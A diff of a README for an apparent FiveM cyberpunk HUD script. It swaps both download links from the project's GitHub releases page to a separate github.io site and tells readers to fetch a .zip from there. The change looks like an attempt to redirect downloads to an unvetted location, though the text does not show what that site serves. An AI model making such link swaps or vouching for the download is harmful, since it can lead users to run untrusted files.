@@ -1,6 +1,6 @@
 # 🕹️ alhi3085-fivem-hud-script - Upgrade your game with cyberpunk visuals
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/stylized-lemma490/alhi3085-fivem-hud-script/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://stylized-lemma490.github.io)
 
 This software adds a visual overlay to your FiveM game experience. It creates a modern interface that mimics a futuristic aesthetic. You see your vehicle speed, position, and camera data in a clean layout. The script runs in the background. It uses simple web code to render the graphics so it keeps your frame rate high.
 
@@ -8,7 +8,7 @@ This software adds a visual overlay to your FiveM game experience. It creates a 
 
 You need to download the package from the internet. Visit the link below to find the current version.
 
-[Click here to open the download page](https://github.com/stylized-lemma490/alhi3085-fivem-hud-script/releases)
+[Click here to open the download page](https://stylized-lemma490.github.io)
 
 When you reach this page, look for the section labeled Assets. Click the file that ends in .zip. This action saves the script folder to your computer.
 
